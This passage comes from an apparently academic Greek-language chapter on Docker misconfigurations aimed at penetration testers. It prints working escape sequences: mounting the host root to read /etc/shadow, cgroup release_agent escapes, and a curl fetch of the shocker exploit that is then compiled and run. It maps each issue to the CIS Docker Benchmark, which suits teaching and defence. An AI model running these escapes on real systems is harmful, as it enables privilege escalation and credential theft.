\chapter{Γνωστές ευπάθειες στο \textlatin{Docker}}
\label{knownDockerCves}

Επειδή το \textlatin{Docker} είναι τόσο δημοφιλές, πολλοί ερευνητές ασφαλείας
προσπαθούν βρουν και να τεκμηριώσουν διάφορες ευπάθειες. Σε αυτό το κεφάλαιο
συζητάμε τα τρωτά σημεία υψηλού αντίκτυπου που είναι χρήσιμα κατά τη διάρκεια
μιας δοκιμής διείσδυσης. Αυτά χωρίζονται σε εσφαλμένες ρυθμίσεις
(\textlatin{misconfiguration} και σφάλματα (\textlatin{bugs}).

Σφάλματα λογισμικού και εσφαλμένες ρυθμίσεις παραμέτρων μπορεί να είναι και τα
δύο προβλήματα ασφαλείας, αλλά διαφέρουν στο ποιος έκανε το λάθος.

Ένα \texttt{\textlatin{bug}} είναι ένα πρόβλημα σε ένα ίδιο το πρόγραμμα. Για
παράδειγμα, υπερχείλιση ενός \textlatin{buffer} είναι ένα σφάλμα. Το πρόβλημα
έγκειται αποκλειστικά στο ίδιο το πρόγραμμα. Για να διορθωθεί, πρέπει να
αλλάξει ο κώδικας του προγραμμάτος.

Οι εσφαλμένες ρυθμίσεις, από την άλλη πλευρά, είναι προβλήματα ασφάλειας που
προκύπτουν από την λάθος χρήση ενός προγράμματος. Το πρόγραμμα δεν έχει
ρυθμιστεί σωστά και αυτό δημιουργεί μια κατάσταση που μπορεί να είναι
εκμεταλλεύσιμη για έναν επιτιθέμενο. Μια δημόσια διαθέσιμη κονσόλα εντοπισμού
σφαλμάτων (\textlatin{debugging console}) σε έναν ιστότοπο 
\footnote{Με αυτό τον τρόπο η εταιρεία \textlatin{Patreon} χακαρίστηκε πριν
κάποια χρόνια. Βλ.\textlatin{https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/}}
ή ένα δημοσίως αναγνώσιμο αρχείο που περιέχει κωδικούς πρόσβασης είναι
παραδείγματα εσφαλμένων ρυθμίσεων. Για να διορθώσει μια εσφαλμένη
ρύθμιση, ο χρήστης θα πρέπει να αλλάξει τη ρύθμιση του προγράμματος ή την
υποδομή του. Οι προγραμματιστές του προγράμματος μπορούν να προτείνουν μόνο
τη σωστή διαμόρφωση που πρέπει να εφαρμόσουν οι χρήστες.

Δεν αποτελούν πλήρη παραδείγματα επιθέσεων όλα τα τρωτά σημεία που καλύπτονται
σε αυτό το κεφάλαιο. Τα περισσότερα είναι χρήσιμα ως μέρος μιας επίθεσης όταν
χρησιμοποιούνται σε συνδυασμό με άλλα τρωτά σημεία. Για παράδειγμα,
παρακάμπτοντας έναν μηχανισμό προστασίας. Ωστόσο, ορισμένα σοβαρά σφάλματα
είναι επικίνδυνα ακόμη και όταν χρησιμοποιούνται από μόνα τους.
Για παράδειγμα, η κακόβουλη χρήση του \textlatin{Docker socket} που καλύπτεται
στην επόμενη ενότητα και το \textlatin{CVE-2019-16884} είναι διαφυγές κοντέινερ.

Επειδή υπάρχουν πολλοί ερευνητές ασφάλειας που αναζητούν σφάλματα στο λογισμικό
\textlatin{containerization}, η ενότητα 4.2 πιθανότατα θα καταστεί ξεπερασμένη
γρήγορα και για αυτό το λόγο δεν θα πρέπει να λαμβάνεται σοβαρά.

Όλοι οι κίνδυνοι αυτών των σφαλμάτων μπορούν να αποφευχθούν χρησιμοποιώντας
την πιο πρόσφατη έκδοση των εικόνων \textlatin{Docker} και του
\textlatin{Docker}.

Λόγω των παραπάνω λόγων, θα επικεντρωθούμε περισσότερο στις εσφαλμένες
ρυθμίσεις σε αυτό το κεφάλαιο και τα επόμενα κεφάλαια.

Στο κεφάλαιο 5 θα δούμε πώς μπορούν να εντοπιστούν αυτά τα τρωτά σημεία
κατά τη διάρκεια μιας δοκιμής διείσδυσης. Στο κεφάλαιο 6 θα συνδυάσουμε τις
πληροφορίες από αυτό το κεφάλαιο και το κεφάλαιο 5 σε μια λίστα ελέγχου.

\section{\textlatin{Misconfigurations}}

Σε αυτήν την ενότητα, θα ρίξουμε μια ματιά στις εσφαλμένες ρυθμίσεις του
\textlatin{Docker} και του αντίκτυπο που μπορεί να έχουν αυτές οι εσφαλμένες
ρυθμίσεις. Για κάθε εσφαλμένη ρύθμιση, θα μελετήσουμε πρακτικά
παραδείγματα καθώς επίσης και τον αντίκτυπο.


Οι δύο πρώτες εσφαλμένες διαμορφώσεις που θα εξετάσουμε σχετίζονται με
επιθέσεις που εκτελούνται σε έναν κεντρικό υπολογιστή και πρόκειται για
επιθέσεις \textlatin{Docker daemon}. Οι άλλες εσφαλμένες ρυθμίσεις σχετίζονται
με επιθέσεις που εκτελούνται μέσα από ένα κοντέινερ όπως διαφυγή κοντέινερ.

Αντιστοιχίζουμε κάθε εσφαλμένη διαμόρφωση στις σχετικές κατευθυντήριες γραμμές
αναφοράς του \textlatin{CIS Docker Benchmark} (εάν υπάρχουν). Θα δούμε ότι το
\textlatin{CIS Docker Benchmark} δεν καλύπτει όλες τις εσφαλμένες
ρυθμίσεις.

\subsection{\textlatin{Docker Permissions}}

Μια συνηθισμένη (και διαβόητη) εσφαλμένη διαμόρφωση είναι η παροχή πρόσβασης
στο \textlatin{Docker} σε μη προνομιούχους χρήστες, το οποίο τους επιτρέπει να
δημιουργούν, να ξεκινούν και άλλοτε να αλληλεπιδρούν με 
με κοντέινερ \textlatin{Docker} (μέσω του \textlatin{Docker Daemon}). Αυτό
είναι επικίνδυνο επειδή επιτρέπει στους μη προνομιούχους χρήστες να έχουν
πρόσβαση σε όλα τα αρχεία ως \texttt{\textlatin{root}}. Η τεκμηρίωση του
\textlatin{Docker} λέει:
\footnote{\textlatin{https://docs.docker.com/engine/security/security/}}.

\emph{Πρώτα απόλα μόνο σε έμπιστους χρήστες πρέπει να επιστρέπεται να έχουν
τον έλεγχο του \textlatin{Docker Daemon}. Αυτό είναι άμεση συνέπεια από κάποια
από τα πιο ισχυρά χαρακτηριστικά του \textlatin{Docker}. Συγκεκριμένα το
\textlatin{Docker}, επιτρέπει σε κάποιον να μοιραστεί έναν κατάλογο μεταξύ του
υπολογιστή όπου τρέχει το \textlatin{Docker} και του φιλοξενούμενου κοντέινερ
και το επιτρέπει αυτό χωρίς να περιορίσει τα δικαιώματα πρόσβασης του κοντέινερ.
Αυτό σημαίνει ότι μπορεί κανείς να ξεκινήσει από ένα κοντέινερ όπου ο κατάλογος
\textlatin{/host} είναι ο κατάλογος / στον κεντρικό υπολογιστή και το κοντέινερ
μπορεί να αλλάξει το σύστημα αρχείων του κεντρικού υπολογιστή χωρίς κανέναν
περιορισμό.}

Εν ολίγοις, επειδή ο \textlatin{Docker Daemon} εκτελείται ως
\texttt{\textlatin{root}}, εάν ένας χρήστης προσθέσει ένα κατάλογο ως
\textlatin{volume} σε ένα κοντέινερ, η πρόσβαση σε αυτό το αρχείο γίνεται ως
\texttt{\textlatin{root}}. Υπάρχουν μερικοί τρόποι πρόσβασης στο Docker για μη
προνομιούχους χρήστες. Σε αυτή την ενότητα θα τους ερευνήσουμε.

\subsubsection{\texttt{\textlatin{docker}} \textlatin{Group}}

Κάθε χρήστης στην ομάδα \texttt{\textlatin{docker}} επιτρέπεται να χρησιμοποιεί
το \textlatin{Docker}.
Αυτό επιτρέπει τη διαχείριση πρόσβασης στη χρήση του \textlatin{Docker}.
Μερικές φορές ένας διαχειριστής συστήματος δεν θέλει να κάνει σωστή διαχείριση
πρόσβασης και προσθέτει κάθε χρήστη στην ομάδα \texttt{\textlatin{docker}},
γιατί αυτό επιτρέπει την ομαλή λειτουργία των πάντων.
Αυτή η εσφαλμένη ρύθμιση, ωστόσο, επιτρέπει σε κάθε χρήστη να έχει πρόσβαση σε
κάθε αρχείο του συστήματος, όπως απεικονίζεται και παρακάτω.

Ας υποθέσουμε ότι θέλουμε ο κατακερματισμένος κωδικός πρόσβασης του
διαχειριστή σε ένα σύστημα όπου δεν έχουμε προνόμια \texttt{\textlatin{sudo}},
αλλά είμαστε μέλος της ομάδας \texttt{\textlatin{docker}}. \\
 
\texttt{\textlatin{(host)\$ sudo -v}}

\texttt{\textlatin{Sorry, user unpriv may not run sudo on host.}}

\texttt{\textlatin{(host)\$ groups | grep -o docker}}

\texttt{\textlatin{docker}}

\texttt{\textlatin{(host)\$ docker run -it --rm -v /:/host ubuntu:latest bash}}

\texttt{\textlatin{(cont)\# grep admin /host/etc/shadow}}

\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}} \\


Στην παραπάνω λίστα ελέγχουμε πρώτα τα δικαιώματα μας. Δεν έχουμε
\texttt{\textlatin{sudo}} δικαιώματα, αλλά είμαστε μέλος της ομάδας
\texttt{\textlatin{docker}}. Αυτό μας επιτρέπει να δημιουργήσουμε ένα κοντέινερ
με / προσαρτημένο ως \textlatin{volume} και αποκτήσoυμε πρόσβαση σε οποιοδήποτε
αρχείο ως \texttt{\textlatin{root}}.
Αυτό περιλαμβάνει το αρχείο με κατακερματισμούς κωδικούς πρόσβασης χρήστη
(π.χ. \texttt{\textlatin{/etc/passwd}}).

Ένα πραγματικό παράδειγμα της επίδρασης των εσφαλμένων ρυθμισμένων διακαιωμάτων
\textlatin{Docker} συνέβη πριν από λίγα χρόνια με ένα από τα μαθήματα στο
\textlatin{Computing Science curriculum} (του \textlatin{Radboud}). Ένα
καθηγητής ήθελε να διδάξει μαθητές σχετικά με \textlatin{containerization} και
την ανάπτυξη σύγχρονου λογισμικού. Ο καθηγητής ζήτησε από το τμήμα πληροφορικής
να εγκαταστήσει το \textlatin{Docker} σε όλους τους φοιτητικούς υπολογιστές και
να προσθέσει όλους τους μαθητές του μαθήματος στην ομάδα
\texttt{\textlatin{docker}} (παρέχοντάς τους πλήρη δικαιώματα για να τρέξου το
\textlatin{Docker}). Αυτό έδωσε σε κάθε μαθητή το ισοδύναμο του
\texttt{\textlatin{root}} δικαιώματα σε κάθε σταθμό εργασίας. Αυτό ήταν ένα
πρόβλημα, επειδή επέτρεπε στους μαθητές να διαβάζουν ευαίσθητες πληροφορίες
(π.χ. ιδιωτικά κλειδιά και κατακερματισμένους κωδικούς πρόσβασης όλων των
χρηστών) και να κάνουν αλλαγές στο σύστημα.

Η ομάδα docker καλύπτεται από την κατευθυντήρια γραμμή 1.2.2 του
\textlatin{CIS Docker Benchmark} (Βεβαιωθείτε ότι επιτρέπεται μόνο σε
αξιόπιστους χρήστες να ελέγχουν τον \textlatin{Docker Daemon}).

\subsubsection{Δημόσια αναγνώσιμο και εγγράψιμο \textlatin{Docker Socket}}

Από προεπιλογή, μόνο ο \texttt{\textlatin{root}} και κάθε χρήστης στην ομάδα
\textlatin{docker} έχει πρόσβαση στο \textlatin{Docker}, επειδή έχουν πρόσβαση
ανάγνωσης και εγγραφής στο \textlatin{Docker Socket}. Ωστόσο, ορισμένοι
διαχειριστές ορίζουν τα δικαιώματα ανάγνωσης και εγγραφής για όλους τους χρήστες
(π.χ \texttt{666}), δίνοντας σε όλους τους χρήστες πρόσβαση στον
\textlatin{Docker Daemon}. \\

\texttt{\textlatin{(host)\$ groups | grep -o docker}}

\texttt{\textlatin{(host)\$ ls -l /var/run/docker.sock}}

\texttt{\textlatin{srw-rw-rw- 1 root docker 0 Dec 15 13:16 /var/run/docker.sock}}

\texttt{\textlatin{(host)\$ docker run -it --rm -v /:/host ubuntu:latest bash}}

\texttt{\textlatin{(cont)\# grep admin /host/etc/shadow}}

\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}} \\

Στη παραπάνω λίστα, βλέπουμε ότι δεν είμαστε μέλος της ομάδας
\textlatin{Docker}, αλλά επειδή κάθε χρήστης έχει πρόσβαση ανάγνωσης και
εγγραφής (δηλαδή τα δικαιώματα "ανάγνωση" και "εγγραφή" έχουν οριστεί για
\textlatin{other}) στο \textlatin{Docker Socket} μπορούμε ακόμα να
χρησιμοποιήσουμε το \textlatin{Docker}.

Αυτό καλύπτεται από την κατευθυντήρια γραμμή 3.4 του
\textlatin{CIS Docker Benchmark} (Βεβαιωθείτε ότι τα δικαιώματα του αρχείου
\texttt{\textlatin{docker.socket}} έχουν οριστεί σε \texttt{644} ή πιο
περιοριστικά).

\subsubsection{\texttt{\textlatin{setuid}} \textlatin{Bit}}

Ένας άλλος τρόπος με τον οποίο οι διαχειριστές συστήματος ενδέχεται να
παραλείψουν τη σωστή διαχείριση πρόσβασης είναι να ορίσουν το \textlatin{bit}
\texttt{\textlatin{setuid}} στο \textlatin{docker binary}.

Το \texttt{\textlatin{setuid}} \textlatin{bit} είναι ένα \textlatin{bit} άδειας
στο \textlatin{Unix}, που επιτρέπει στους χρήστες να τρέξουν
\textlatin{binaries} ως κάτοχος (ή ομάδα) του \textlatin{binary} αντί για τον
εαυτό τους. Αυτό είναι χρήσιμο σε συγκεκριμένες περιπτώσεις. Για παράδειγμα,
οι χρήστες θα πρέπει να μπορούν να αλλάζουν τους δικούς τους κωδικούς πρόσβασης,
αλλά δεν θα πρέπει να είναι σε θέση να διαβάσουν τους κατακερματισμούς κωδικών
πρόσβασης άλλους χρήστες. Γι' αυτό το \texttt{\textlatin{passwd}}
\textlatin{binary} (το οποίο χρησιμοποιείται για την αλλαγή του κωδικού
πρόσβασης κάποιου χρήστη) έχει οριστεί το \texttt{\textlatin{setuid}}
\textlatin{bit}. Ένας χρήστης μπορεί να αλλάξει τον κωδικό πρόσβασής του,
επειδή το \texttt{\textlatin{passwd}} εκτελείται ως \texttt{\textlatin{root}}
(ο κάτοχος του \texttt{\textlatin{passwd}}) και, φυσικά, ως
\texttt{\textlatin{root}} μπορεί να διαβάζει και να γράφει στο αρχείο κωδικού
πρόσβασης. Σε αυτή την περίπτωση το \texttt{\textlatin{setuid}} \textlatin{bit}
δεν είναι θέμα ασφαλείας, επειδή το \texttt{\textlatin{passwd}} ζητά τον κωδικ
πρόσβασης του χρήστη από μόνο του και θα αλλάξει μόνο συγκεκριμένες καταχωρήσεις
στο αρχείο κωδικού πρόσβασης.

Εάν ένα σύστημα έχει ρυθμιστεί εσφαλμένα με τη ρύθμιση του
\texttt{\textlatin{setuid}} \textlatin{bit} για το \textlatin{docker binary},
ένας χρήστης θα μπορεί να εκτελέσει το \textlatin{Docker} ως
\texttt{\textlatin{root}} (ο κάτοχος του \textlatin{docker binary}). Όπως και
πριν, μπορούμε εύκολα να αναπαράξουμε αυτήν την επίθεση. \\

\texttt{\textlatin{(host)\$ sudo -v}}

\texttt{\textlatin{Sorry, user unpriv may not run sudo on host.}}

\texttt{\textlatin{(host)\$ groups | grep -o docker}}

\texttt{\textlatin{(host)\$ ls -halt /usr/bin/docker}}

\texttt{\textlatin{-rwsr-xr-x 1 root root 85M nov 18 17:52 /usr/bin/docker}}

\texttt{\textlatin{(host)\$ docker run -it --rm -v /:/host ubuntu:latest bash}}

\texttt{\textlatin{(cont)\# grep admin /host/etc/shadow}}

\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}} \\

Στη παραάνω λίστα βλέπουμε ότι δεν είμαστε μέρος της ομάδας \textlatin{docker},
αλλά μπορούμε ακόμα να εκτελέσουμε το \textlatin{docker} επειδή το
\texttt{\textlatin{setuid}} \textlatin{bit} (και το
\texttt{\textlatin{execute}} \textlatin{bit} για όλους χρήστες) έχει οριστεί.

Αυτό δεν καλύπτεται από τις κατευθυντήριες γραμμές του
\textlatin{CIS Docker Benchmark}. Υπάρχουν πολλές οδηγίες σχετικά με τα σωστά
δικαιώματα αρχείων και καταλόγου, αλλά καμία δεν καλύπτει τα
\textlatin{binaries}.

\subsection{Αναγνώσιμα αρχεία ρυθμίσεων}

Επειδή η ρύθμιση περιβαλλόντων με το \textlatin{Docker} μπορεί να είναι
αρκετά περίπλοκη, πολλοί χρήστες \textlatin{Docker} χρησιμοποιούν προγράμματα
(π.χ. \texttt{\textlatin{docker-compose}}) για να αποθηκεύσουν όλες τις
απαραίτητες ρυθμίσεις \textlatin{Docker} στα αρχεία διαμόρφωσης για να
καταργήσουν την ανάγκη επαναληπτικών βημάτων και διαμορφώσεων. Αυτά τα αρχεία
ρυθμίσεων συχνά περιέχουν ευαίσθητες πληροφορίες. Εάν τα δικαιώματα σε αυτά τα
αρχεία δεν έχουν ρυθμιστεί σωστά, οι χρήστες οι οποίοι δεν θα έπρεπε να μπορούν
να τα διαβάσουν θα τα διαβάζουν.

Οι χρήστες \textlatin{Docker} και οι \textlatin{penetration testers} θα πρέπει
να δώσουν ιδιαίτερη προσοχή σε αυτά αρχεία, γιατί θα μπορούσαν εύκολα να
οδηγήσουν σε διαρροή μυστικών.

Δύο κοινά αρχεία που ενδέχεται να περιέχουν ευαίσθητες πληροφορίες είναι τα 
\texttt{\textlatin{.docker
/config.json}} και \texttt{\textlatin{docker-compose.yaml}}.

Αυτό δεν καλύπτεται σε καμία οδηγία του \textlatin{CIS Docker Benchmark}. Καλύπτονται πολλά αρχεία διαμόρφωσης (π.χ. /etc/docker/daemon.json), αλλά
δεν υπάρχουν αρχεία καθορισμένα από το χρήστη.

\subsubsection{\texttt{\textlatin{.docker/config.json}}}

Κατά το ανέβασμα εικόνων σε ένα μητρώο, οι χρήστες πρέπει να συνδεθούν στο
μητρώο στο οποίο πιστοποιούν τον εαυτό τους. Θα ήταν αρκετά ενοχλητικό να
συνδεόμαστε κάθε φορά που ένας χρήστης θέλει να ανεβάσει μια εικόνα. Αυτός
είναι ο λόγος για τον οποίο το \texttt{\textlatin{.docker/config.json}}
αποθηκεύει προσωρινά αυτά τα \textlatin{credentials}. Αυτά είναι αποθηκευμένα
σε κωδικοποίηση \textlatin{Base64} στον αρχικό κατάλογο του χρήστη από
προεπιλογή
\footnote{\textlatin{https://docs.docker.com/engine/reference/commandline/login/}}.
Ένας επιτιθέμενος με πρόσβαση στο αρχείο μπορεί να χρησιμοποιήσει τα
\textlatin{credentials} για να συνδεθεί και να ανεβάσει κακόβουλες εικόνες
\textlatin{Docker} \cite{Docker-Credentials-Metasploit}.

\subsubsection{\texttt{\textlatin{docker-compose.yml}}}

Τα αρχεία \texttt{\textlatin{docker-compose.yml}} συχνά περιέχουν μυστικά (π.χ.
κωδικούς πρόσβασης και κλειδιά \textlatin{API}), επειδή όλες οι πληροφορίες που
πρέπει να διαβιβαστούν σε ένα κοντέινερ αποθηκεύονται στο
αρχείο \texttt{\textlatin{docker-compose.yml}} \footnote{Η καταλήξεις
\texttt{\textlatin{yml}} και \texttt{\textlatin{yaml}} είναι ταυτοδύναμες όμως
η επίσημη είναι η \texttt{\textlatin{yaml}}}.

\subsection{\textlatin{Privileged Mode}}

Το \textlatin{Docker} έχει μια ειδική προνομιακή λειτουργία
\cite{Docker-in-Docker-Blog}. Αυτή η λειτουργία είναι ενεργοποιημένη εάν κατά
την δημιουργία ενός κοντέινερ δοθεί η παράμετρος
\texttt{\textlatin{--privileged}} η οποία επιτρέπει τη πρόσβαση σε όλους τους
κεντρικούς υπολογιστές συσκευές και σε δυνατότητες του πυρήνα. Αυτή είναι μια
ισχυρή λειτουργία που επιτρέπει ορισμένες χρήσιμες λειτουργίες (π.χ. δημιουργία
εικόνων \textlatin{Docke} μέσα σε κοντέινερ \textlatin{Docker}). Το μειονέκτημα
της προνομιακής λειτουργίας είναι ότι όλες οι λειτουργίες του πυρήνα επιτρέπουν
σε ένα επιτιθέμενο μέσα στο κοντέινερ να διαφύγει και να αποκτήσει πρόσβαση
στον κεντρικό υπολογιστή.

Ένα παράδειγμα αυτού είναι η κατάχρηση ενός χαρακτηριστικού στα
\texttt{\textlatin{cgroups}} \cite{CGroup-Docs}. Όποτε ένα 
\texttt{\textlatin{cgroup}} απελευθερώνεται λόγω απουσίας διεργασιών που
τρέχουν, είναι δυνατό για να εκτελέσουμε μια εντολή (που ονομάζεται
\textlatin{release\_agent}). Είναι δυνατόν να ορίσουμε τέτοια
\textlatin{release\_agent} σε ένα προνομιακό \textlatin{docker}.
Εάν το \texttt{\textlatin{cgroup}} απελευθερωθεί, τότε
η εντολή εκτελείται στον κεντρικό υπολογιστή \cite{TrailOfBits-Docker-Escape}.

Μπορούμε να δούμε μια απόδειξη της ιδέας αυτής της επίθεσης που αναπτύχθηκε από
τον ερευνητή ασφαλείας Felix Wilhelm \cite{Felix-Wilhem-Tweet}. \\

\texttt{\textlatin{1. (host)\$ docker run -it --rm --privileged ubuntu:latest bash}}

\texttt{\textlatin{2. (cont)\# d=`dirname \$(ls -x /s*/fs/c*/*/r* |head -n1)`}}

\texttt{\textlatin{3. (cont)\# mkdir -p \$d/w}}

\texttt{\textlatin{4. (cont)\# echo 1 >\$d/w/notify\_on\_release}}

\texttt{\textlatin{5. (cont)\# t=`sed -n 's/.*\textbackslash perdir=\textbackslash ([\^,]*\textbackslash ).*/\textbackslash 1/p' /etc/mtab`}}

\texttt{\textlatin{6. (cont)\# touch /o}}

\texttt{\textlatin{7. (cont)\# echo \$t/c >\$d/release\_agent}}

\texttt{\textlatin{8. (cont)\# printf '\#!/bin/sh\textbackslash nps >'"\$t/o" >/c}}

\texttt{\textlatin{9. (cont)\# chmod +x /c}}

\texttt{\textlatin{10. (cont)\# sh -c "echo 0 >\$d/w/cgroup.procs"}}

\texttt{\textlatin{11. (cont)\# sleep 1}}

\texttt{\textlatin{12. (cont)\# cat /o}} \\

Η απόδειξη της έννοιας στη παραπάνω λίστα είναι λίγο δύσκολο να διαβαστεί,
γιατί χρησιμοποιεί πολλή σύνταξη \textlatin{Bash} για να συντομεύσει τις
εντολές. Θα αναλύσουμε τις εντολές γραμμή προς γραμμή για να εξηγήσουμε τι
κάνει κάθε μία.

Στη γραμμή 2, το πρώτο \textlatin{cgroup} με \textlatin{release\_agent}
προστίθεται στη μεταβλητή \textlatin{d}. Μια υποομάδα \textlatin{w} προστίθεται
στην ομάδα \textlatin{c} του \textlatin{d} (γραμμή 3) και η εκτέλεση του
\textlatin{release\_agent} είναι ενεργοποιημένο για το \textlatin{w} (γραμμή 4).
Η θέση του κοντέινερ στο σύστημα αρχείων του κεντρικό σύστημα αρχείων
προστίθεται στη μεταβλητή \textlatin{t} (γραμμή 5). Ένα \textlatin{script}
το (/\textlatin{c}), που περιέχει μόνο τη γραμμή "\textlatin{ps > \$t/o"},
δημιουργείται (γραμμή 7) και προστίθεται
ως \textlatin{release\_agent} (γραμμή 8). Μια διαδικασία προσθέτει το εαυτό της
στο \textlatin{w} (γράφοντας «0» στο αρχείο \textlatin{cgroup.procs} του 
\textlatin{w}) στη γραμμή 10. Μετά την εκτέλεση του \textlatin{release\_agent}
(/\textlatin{c}), μπορούμε να δούμε όλες τις διεργασίες στον κεντρικό
υπολογιστή στο /\textlatin{ο}.

Το όρισμα \texttt{\textlatin{--privileged}} καλύπτεται από δύο κατευθυντήριες
γραμμές του \textlatin{CIS Docker Benchmark}. Η Οδηγία 5.4 (Βεβαιωθείτε ότι δεν
χρησιμοποιούνται προνομιακά κοντέινερ) συνιστά να μην δημιουργούμε κοντέινερ με
προνομιακή λειτουργία. Η κατευθυντήρια γραμμή 5.22 (Βεβαιωθείτε ότι οι εντολές
\textlatin{docker exec} δεν χρησιμοποιούνται με την προνομιακή επιλογή) συνιστά
να μην εκτελούνται εντολές σε κοντέινερ που εκτελούνται (με
\textlatin{docker exec}) σε προνομιακή λειτουργία.

\subsection{Δυνατότητες}

Όπως είδαμε σε προηγούμενη ενότητα, προκειμένου να πραγματοποιηθούν προνομιακές
ενέργειες στο πυρήνα \textlatin{Linux}, μια διεργασία χρειάζεται τη σχετική
δυνατότητα. Τα \textlatin{Docker} κοντέινερς ξεκινούν με ελάχιστες δυνατότητες, αλλά είναι
δυνατή η προσθήκη επιπλέον δυνατοτήτων κατά το χρόνο εκτέλεσης. Η παροχή
επιπλέον δυνατοτήτων στα κοντέινερς δίνει στο κοντέινερ άδεια εκτέλεσης
ορισμένων ενεργειών. Ορισμένες από αυτές τις ενέργειες επιτρέπουν να διαφύγει
κανείς από το \textlatin{Docker} κοντέινερ. Θα εξετάσουμε δύο τέτοιες
δυνατότητες στις επόμενες ενότητες.


Το \textlatin{CIS Docker Benchmark} καλύπτει όλα αυτά τα προβλήματα σε μία
κατευθυντήρια γραμμή: 5.3 (Βεβαιωθείτε ότι οι δυνατότητες του πυρήνα του
\textlatin{Linux} είναι περιορισμένες εντός των κοντέινερ).

\subsubsection{\texttt{\textlatin{CAP\_SYS\_ADMIN}}}

Η απόδραση \textlatin{Docker} σύμφωνα με τον \textlatin{Felix Wilhelm}
\cite{Felix-Wilhem-Tweet} που χρησιμοποιήσαμε στην ενότητα 4.1.3 χρειάζεται να
εκτελείται σε προνομιακή λειτουργία για να λειτουργήσει, αλλά μπορεί να
ξαναγραφτεί για να χρειάζεται μόνο το δικαίωμα εκτέλεσης του προσαρτήματος
\cite{TrailOfBits-Docker-Escape}, το οποίο χορηγείται από την δυνατότητα
\texttt{\textlatin{CAP\_SYS\_ADMIN}}. \\

\texttt{\textlatin{1. (host)\$ docker run --rm -it --cap-add=CAP\_SYS\_ADMIN --security -opt apparmor=unconfined ubuntu /bin/bash}}

\texttt{\textlatin{2. (cont)\# mkdir /tmp/cgrp}}

\texttt{\textlatin{3. (cont)\# mount -t cgroup -o rdma cgroup /tmp/cgrp}}

\texttt{\textlatin{4. (cont)\# mkdir /tmp/cgrp/x}}

\texttt{\textlatin{5. (cont)\# echo 1 > /tmp/cgrp/x/notify\_on\_release}}

\texttt{\textlatin{6. (cont)\# host\_path=`sed -n 's/.*\textbackslash perdir=\textbackslash ([\^,]*\textbackslash).*/\textbackslash 1/p' /etc/mtab`}}

\texttt{\textlatin{7. (cont)\# echo "\$host\_path/cmd" > /tmp/cgrp/release\_agent}}

\texttt{\textlatin{8. (cont)\# echo '\#!/bin/sh' > /cmd}}

\texttt{\textlatin{9. (cont)\# echo "ps aux > \$host\_path/output" >> /cmd}}

\texttt{\textlatin{10. (cont)\# chmod a+x /cmd}}

\texttt{\textlatin{11. (cont)\# sh -c "echo \textbackslash \$\textbackslash \$ > /tmp/cgrp/x/cgroup.procs"1}}

\texttt{\textlatin{12. (cont)\# cat /output}} \\

Σε αντίθεση με πριν, αντί να βασιζόμαστε στη παράμετρο
\texttt{\textlatin{--privileged}} για να μας δώσει πρόσβαση εγγραφής σε ένα
\textlatin{cgroup}, πρέπει απλώς να κάνουμε \textlatin{mount} τη δική μας. Στη
γραμμή 2 και γραμμή 3 ένα νέο \textlatin{cgroup} με όνομα \textlatin{cgrp}
δημιουργείται και προσαρτάται στο \textlatin{/tmp/cgrp}. Τώρα έχουμε ένα
\textlatin{cgroup} στο οποίο έχουμε επίσης πρόσβαση εγγραφής, έτσι μπορούμε να
εκτελέσουμε το ίδιο \textlatin{exploit} όπως στο ενότητα 4.1.3.

\subsubsection{\texttt{\textlatin{CAP\_DAC\_READ\_SEARCH}}}

Πριν το \textlatin{Docker} 1.0.0 το \textlatin{CAP\_DAC\_READ\_SEARCH}
προστέθηκε στις προεπιλεγμένες δυνατότητες που παρέχονται σε ένα κοντέινερ.
Αλλά αυτή η ικανότητα επιτρέπει σε μια διαδικασία να ξεφύγει από ένα κοντέινερ
\cite{Docker-Shocker-Seclists}. Μια διαδικασία με
\textlatin{CAP\_DAC\_READ\_SEARCH} είναι είναι σε θέση να κάνει
\textlatin{bruteforce} το εσωτερικό ευρετήριο (\textlatin{internal index}) των
αρχείων εκτός του κοντέινερ. Ως απόδειξη της εκμετάλλευσης της συγκεκριμένης
επίθεσης, δημοσιοποιήθηκε ένα \textlatin{Proof of concept} \cite{Docker-Shocker}
\cite{Docker-Shocker-Analysis}. Αυτό το \textlatin{exploit} κυκλοφόρησε το 2014,
αλλά εξακολουθεί να λειτουργεί σε κοντέινερ με την ικανότητα
\textlatin{CAP\_DAC\_READ\_SEARCH}. \\

\texttt{\textlatin{(host)\$ curl -o /tmp/shocker.c http://stealth.openwall.net/xSports/shocker.c}}

\texttt{\textlatin{(host)\$ sed -i "s/\textbackslash /.dockerinit/\textbackslash /tmp\textbackslash /a.out/" shocker.c}}

\texttt{\textlatin{(host)\$ cc -Wall -std=c99 -O2 shocker.c -static}}

\texttt{\textlatin{(host)\$ docker run --rm -it --cap-add=CAP\_DAC\_READ\_SEARCH -v /tmp:/tmp busybox sh}}

\texttt{\textlatin{(cont)\# /tmp/a.out}}

\texttt{\textlatin{...}}

\texttt{\textlatin{[!] Win! /etc/shadow output follows:}}

\texttt{\textlatin{...}}

\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}} \\

Το \textlatin{exploit} χρειάζεται ένα αρχείο με χειρισμό αρχείου στο κεντρικό
σύστημα για να πετύχει. Αντί για το προεπιλεγμένο
\texttt{\textlatin{/.dockerinit}} (το οποίο δεν δημιουργείται πλέον σε
νεότερες εκδόσεις του \textlatin{Docker}) χρησιμοποιούμε το ίδιο το αρχείο
\textlatin{exploit /tmp/a.out}. Αρχίζουμε ένα κοντέινερ με την ικανότητα
\texttt{\textlatin{CAP\_DAC\_READ\_SEARCH}} και εκτελούμε το \textlatin{exploit}.
Παρατηρούμε ότι εκτυπώνει το αρχείο κωδικού πρόσβασης του κεντρικού υπολογιστή
(π.χ. \textlatin{/etc/shadow}).

\subsection{\textlatin{Docker Socket}}

Το \textlatin{Docker Socket} (δηλαδή \texttt{\textlatin{/var/run/docker.sock}})
είναι ο τρόπος με τον οποίο οι \textlatin{clients} επικοινωνούν με το
\textlatin{Docker daemon}. Κάθε φορά που ένας χρήστης εκτελεί μια
\textlatin{Docker client} εντολή, ο \textlatin{Docker client} στέλνει ένα
αίτημα \textlatin{HTTP} στο \textlatin{docker socket}.

Δεν χρειάζεται να χρησιμοποιήσουμε το \textlatin{Docker client}, αλλά μπορούμε
